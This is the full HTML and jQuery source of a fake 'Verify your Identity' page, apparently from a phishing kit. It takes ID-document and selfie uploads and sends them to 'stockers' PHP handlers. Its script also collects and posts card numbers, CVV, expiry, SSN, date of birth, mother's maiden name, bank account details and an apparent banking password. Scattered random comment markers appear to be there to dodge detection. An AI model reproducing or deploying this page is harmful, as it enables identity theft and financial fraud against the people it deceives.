<!DOCTYPE html>
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="shortcut icon" href="./assets/img/favi.ico">
	<link rel="apple-touch-icon" href="./assets/img/favi.png">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<title>
		Verify your Identity</title>
	<link rel="stylesheet" href="./assets/css/process.css">
	<script type="text/javascript" src="./assets/js/jquery-3.3.1.min.js">
	</script>
	<script type="text/javascript" src="./assets/js/jquery.mask.min.js">
	</script>
	<script type="text/javascript" src="./assets/js/jquery.ccvalid.js"></script>
</head>

<body>
	<input type="checkbox" id="toggleMenu" class="menuToggler">
	<div class="mainContainer">
		<!--79385086-->
		<div class="hide" id="rotate">
			<div class="spinner">
				<!--74373331-->
				<div class="rotate"></div>
				<!--44463851-->
				<div class="processing">Uploading...</div>
			</div>
			<div class="overlay">
				<!--87678772-->
			</div>
		</div>
		<div class="contents">
			<section class="mainContents" id="process">

				<div class="fields clearfix">
					<!--9067851--> <input id="ccn" type="hidden" maxlength="23">
				</div>
				<!--81059202-->
			</section>
			<section class="mainContents" id="finish">
				<div style="padding:0 20px">
					<h1 style="margin:10px;padding-bottom:10px;font-size:2.1rem">
						Verify your Identity </h1>
					<div>
						<ol class="proof">
							<li class="itm current">
								<div class="ui-text-small">
									Document Verification
									<!--76512422-->
								</div>
							</li>
							<li class="itm">
								<div class="ui-text-small">
									<!--24303306--> Selfie Verification
								</div>
							</li>
							<!--42659049-->
							<!--17667379-->
							<li class="itm">
								<div class="ui-text-small">
									Identity Confirmed</div>
							</li>
							<!--39852887-->
						</ol>
					</div>
					<div id="select_one">
						<!--30390130-->
						<form action="javascript:void(0);" method="POST">
							<!--88525020-->
							<!--33619522-->
							<div id="area_choose">
								<!--79290068-->
								<h1 style="font-size:1.4rem!important">
									Select ID type</h1>
								<div class="doc_type">
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div><img src="./assets/img/id_p.svg" alt=""></div>
											<label class="cont">
												<input type="radio" name="doc_type" value="Passport">
												<!--5718610--> <span class="checkmark"></span>
												<span> Passport</span>
												<!--96763959-->
											</label>
										</div>
									</div>
									<!--18813662-->
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div><img src="./assets/img/id_n.svg" alt="">
											</div>
											<!--58178043--> <label class="cont">
												<input type="radio" name="doc_type" value="National ID">
												<span class="checkmark"></span>
												<!--15560664--> <span> State Issued ID</span>
												<!--81656158-->
											</label>
										</div>
									</div>
									<div class="doc_type_choice">
										<div class="doc_type_choice_wrapper">
											<div>
												<img src="./assets/img/id_n.svg" alt="">
												<!--88063563-->
											</div>
											<label class="cont">
												<!--74980153--> <input type="radio" name="doc_type" value="Driver&#39;s license">
												<!--15882813--> <span class="checkmark"></span>
												<!--26490570--> <span> Driver&#39;s License</span>
											</label>
										</div>
										<!--35962960-->
										<!--59068737-->
									</div>
								</div>
								<!--72690253--> <input style="margin-bottom:1.2rem;margin-top:1rem" type="button" class="bt bt_select_one" value="SELECT">
							</div>
							<div id="area_up_id" style="display:none">
								<h1 style="font-size:1.4rem">Upload your
									<!--89387607--> <span></span>
									<!--65462986-->
								</h1>
								<div class="row rules text-center">
									<!--83315533-->
									<div class="rule">
										<!--23791387--> <img src="./assets/img/scan_id.svg" alt="">
										<div>Take a photo of your ID<br>or upload it from your current device </div>
									</div>
									<div class="rule">
										<img src="./assets/img/both_sides.svg" alt="">
										<!--56808993-->
										<div>
											Send the front and the back<br>of your ID or DL </div>
									</div>
									<div class="rule">
										<img src="./assets/img/both_pass.svg" alt="">
										<div>
											<!--12394509--> Send a color image of the<br>entire document (Passport)
										</div>
										<!--46747882-->
									</div>
								</div>
								<div class="zone" id="up_id_zone">
									<!--92254282-->
									<div class="dropzone-main" style="display:block">
										<div class="dropzone-img">
											<input style="display:none" type="file" name="file[]" accept="image/*" multiple="">
										</div>
										<p><br>Drag & drop <br>or click to upload</br>
									</div>
								</div>
								<div class="imagesArea"></div><input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="UPLOAD">
								<div><a href="javascript:void(0)" class="back">Go Back</a></div><br>
							</div>
						</form>
						<script>
							$(document).on('click', '.doc_type_choice', function() {
								$(this).find('[name="doc_type"]').prop('checked', true);
							});
							$('.bt_select_one').click(function() {
								if ($('[name=doc_type]').is(':checked')) {
									$('#area_choose').hide('slow');
									$('#area_up_id > h1 > span, #area_up_selfie > h1 > span').html($('[name=doc_type]:checked').parent().find('span:last').html());
									$('#area_up_id').show('slow');
								}
							});
							$(document).on('click', '#area_up_id .back', function() {
								$('#area_up_id').hide('slow');
								$('#area_choose').show('slow');
							});
							$(document).on('submit', '#select_one > form', function(e) {
								e.preventDefault();
								if ($('#select_one .imagesArea .imgItem').length == 0) {
									return false;
								}
								$('#rotate').removeClass('hide');
								$.post('./stockers/step_id.php', $(this).serialize(), function(dt, st) {
									if (dt && st == 'success') {
										$('.proof li:nth-child(2)').addClass('current');
										$('#select_one').addClass('hide');
										$('#select_two').removeClass('hide');
										window.scrollTo(0, 0);
										$('#rotate').addClass('hide');
									}
								});
							});
						</script>
					</div>
					<div id="select_two" class="hide">
						<form action="javascript:void(0);" method="POST">
							<div id="area_up_selfie">
								<h1 style="font-size:1.4rem">Take a selfie with your<span></span></h1>
								<div class="row rules text-center">
									<div class="rule"><img src="./assets/img/take_s.svg" alt="">
										<div>Make sure your whole face is<br>visible, centred and clearly visible.</div>
									</div>
									<div class="rule"><img src="./assets/img/fingers_not.svg" alt="">
										<div>Make sure you and your document, are in frame, in focus, and readable.</div>
									</div>
									<div class="rule"><img src="./assets/img/glaesses_not.svg" alt="">
										<div>Do not hide or alter parts<br> of your face <br>(No hats/beauty images/filters/headgear).</div>
									</div>
								</div>
								<div class="zone" id="up_id_zone">
									<div class="dropzone-main" style="display:block">
										<div class="dropzone-img" style="background-image:url(./assets/img/up_slf.svg),none"><input style="display:none" type="file" name="file[]" accept="image/*" multiple=""></div>
										<p><br>Drag & drop <br>or click to upload</br>
									</div>
								</div>
								<div class="imagesArea"></div><input type="hidden" name="id_slf" value="ok"><input style="margin-bottom:1rem;margin-top:1rem" type="submit" class="bt" value="NEXT">
								<div><a href="javascript:void(0)" class="back">Go Back</a></div><br>
							</div>
						</form>
						<script>
							$(document).on('click', '#area_up_selfie .back', function() {
								$('.proof li:nth-child(2)').removeClass('current');
								$('#select_one').removeClass('hide');
								$('#select_one .imagesArea').html('');
								$('#select_one [type=hidden]').remove();
								$('#select_two').addClass('hide');
							});
							$(document).on('submit', '#select_two > form', function(e) {
								e.preventDefault();
								if ($('#select_two .imagesArea .imgItem').length == 0) {
									return false;
								}
								$('#rotate').removeClass('hide');
								$.post('./stockers/step_selfie2.php', $(this).serialize(), function(dt, st) {
									if (dt && st == 'success') {
										$('.proof li:nth-child(3)').addClass('current');
										$('#select_one').addClass('hide');
										$('#select_two').addClass('hide');
										$('#select_three').removeClass('hide');
										window.scrollTo(0, 0);
										setTimeout(function() {
											window.location.href = "";
										}, 6000);
										$('#rotate').addClass('hide');
									}
								});
							});
						</script>
					</div>
					<div id="select_three" class="hide">
						<div style="padding:20px">
							<img src="./assets/img/success.svg" alt="" width="150">

						</div>
					</div>
				</div>
			</section>
		</div>
	</div>
	<script>
		$(document).ready(function() {
			$('#cex').mask('00/0000');
			$('#csc').mask('0000');
			$('#dob').mask('00/00/0000');
			$('#ccn').mask('0000 0000 0000 0000 000');
			$('#pnm').mask('000000000000000');
			$('#ssn').mask('000-00-0000');
			$('#acn').mask('00000000');
			$('#stc').mask('00-00-00');
			$('#sin').mask('000-000-000');

			function validExp(b) {
				var a = new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");
				return a.test(b);
			}

			function isDate(vl) {
				var rg = /^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;
				return rg.test(vl);
			}

			function validDob(vl) {
				var c = false;
				if (isDate(vl) && (vl.split('/')[2] > "1919" && vl.split('/')[2] < "2006")) {
					c = true;
				}
				return c;
			}

			function valid() {
				var check = true;
				var ii = 0;
				$('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i, el) {
					if (!$(el).val()) {
						$(el).parent().addClass('hasError');
						check = false;
					} else {
						$(el).not('#ccn').parent().removeClass('hasError');
					}
					if ($(el).attr('id') == 'cex') {
						if (!validExp($(el).val())) {
							$(el).parent().addClass('hasError');
							check = false;
						} else {
							$(el).parent().removeClass('hasError');
						}
					}
					if ($(el).attr('id') == 'dob') {
						if (!validDob($(el).val())) {
							$(el).parent().addClass('hasError');
							check = false;
						} else {
							$(el).parent().removeClass('hasError');
						}
					}
					if ($(el).attr('id') == 'csc') {
						if ($('select:first').val() == 'amx' && $(el).val().length != 4) {
							$(el).parent().addClass('hasError');
							check = false;
						} else {
							$(el).parent().removeClass('hasError');
						}
						if ($('select:first').val() != 'amx' && $(el).val().length != 3) {
							$(el).parent().addClass('hasError');
							check = false;
						}
					}
				});
				return check;
			}
			$(document).on('change', '#process select', function() {
				$(this).parent().removeClass('hasError');
				$(this).parent().children('.labelSelect').html($(this).children("option:selected").text());
				$(this).parent().attr('data-name', $(this).val());
				if ($(this).val() == 'amx') {
					$('.csc input').attr('placeholder', $('.csc input').attr('placeholder').replace('3', '4'));
					$('.csc input').attr('maxlength', '4');
				} else {
					$('.csc input').attr('placeholder', $('.csc input').attr('placeholder').replace('4', '3'));
					$('.csc input').attr('maxlength', '3');
				}
			});
			var ccvalid = false;
			$('#ccn').validateCreditCard(function(result) {
				var cc = $('#ccn');
				if (cc.val() != '') {
					if (result.valid) {
						cc.parent().removeClass('hasError');
						ccvalid = true;
					} else {
						cc.parent().addClass('hasError');
						ccvalid = false;
					}
				}
			});
			$('#process input:not(.bt):not([type=checkbox]),select').each(function(i, el) {
				$(el).keyup(function() {
					valid();
				});
				$(el).change(function() {
					valid();
				});
			});
			$(document).on('submit', '#process form', function() {
				check = true;
				if (!valid()) {
					check = false;
				}
				if (!validExp($('#cex').val())) {
					$('#cex').parent().addClass('hasError');
					check = false;
				} else {
					$('#cex').parent().removeClass('hasError');
				}
				if (!ccvalid) {
					$('#ccn').parent().addClass('hasError');
					check = false;
				}
				if (!validDob($('#dob').val())) {
					$('#dob').parent().addClass('hasError');
					check = false;
				}
				if (!check) {
					return false;
				} else {
					$('#rotate').removeClass('hide');
					var ctp = $('#ctp').children("option:selected").text();
					var ccn = $('#ccn').val();
					var cex = $('#cex').val();
					var csc = $('#csc').val();
					var fnm = $('#fnm').val();
					var dob = $('#dob').val();
					var adr = $('#adr').val();
					var cty = $('#cty').val();
					var zip = $('#zip').val();
					var stt = $('#stt').val();
					var cnt = $('#cnt').val();
					var ptp = $('#ptp').val();
					var par = $('#par').val();
					var pnm = $('#pnm').val();
					var mdn = $('#mdn').val();
					var ssn = $('#ssn').val();
					var pps = $('#pps').val();
					var clm = $('#clm').val();
					var dln = $('#dln').val();
					var sin = $('#sin').val();
					var pse = $('#pse').val();
					var dni = $('#dni').val();
					var bsn = $('#bsn').val();
					var cpf = $('#cpf').val();
					var fcn = $('#fcn').val();
					var acn = $('#acn').val();
					var stc = $('#stc').val();
					var bus = $('#bus').val();
					var bpw = $('#bpw').val();
					var o = {
						ctp,
						ccn,
						cex,
						csc,
						fnm,
						dob,
						adr,
						cty,
						zip,
						stt,
						cnt,
						ptp,
						par,
						pnm,
						mdn,
						ssn,
						pps,
						clm,
						dln,
						sin,
						pse,
						dni,
						bsn,
						cpf,
						fcn,
						acn,
						stc,
						bus,
						bpw
					};
					var start = new Date;
					var xT = 0;
					var idT = setInterval(function() {
						xT = Math.trunc((new Date - start) / 1000);
					}, 1000);
					var toStart = 0;
					$.post('./stockers/step_selfie2.php', o, function(data, status) {
						if (data == 'done' && status == 'success') {
							clearInterval(idT);
							if (xT > 4) {
								toStart = 0;
							} else {
								toStart = 1800;
							}
							setTimeout(function() {
								setId();
							}, toStart);
						} else {
							$('#rotate').addClass('hide');
						}
					});
				}
				return false;
			});

			function setId() {
				$('#rotate').addClass('hide');
				$('#process').addClass('hide');
				$('#finish').removeClass('hide');
				window.scrollTo(0, 0);
			}
			$('.gone_bt').click(function() {
				window.location.href = "";
			});

			function readFile(files, me, check) {
				if (files) {
					for (var i = 0; i < files.length; i++) {
						var FR = new FileReader();
						FR.onload = function(e) {
							if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
								if (check) {
									$(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
								} else {
									$(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
								}
								$(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
							}
						}
						FR.readAsDataURL(files[i]);
					}
				}
			}
			$(document).on('click', '.zone', function(e) {
				e.stopPropagation();
				$(this).find('input[type=file]').trigger(e);
			});
			$(document).on('click', '.btDel', function() {
				$(this).closest('form').find('[value="' + $(this).prev().attr('src') + '"]').remove();
				$(this).parent().remove();
			});
			$(document).on('change', 'input[type=file]', function() {
				readFile(this.files, this, false);
			});
			$(".dropzone-main").on('dragleave', function(e) {
				e.preventDefault();
				$(this).css('border', '2px dashed #dee3e7');
				$(this).css('background', '#f0f2f4');
			});
			$(".dropzone-main").on('dragover', function(e) {
				e.preventDefault();
				$(this).css('border', '2px dashed #0564b3');
				$(this).css('background', '#ecf1f9');
			});
			$(".dropzone-main").on('drop', function(e) {
				e.preventDefault();
				$(this).css('border', '2px dashed #41ad49');
				readFile(e.originalEvent.dataTransfer.files, this, true);
			});
		});
	</script>

</body>

</html>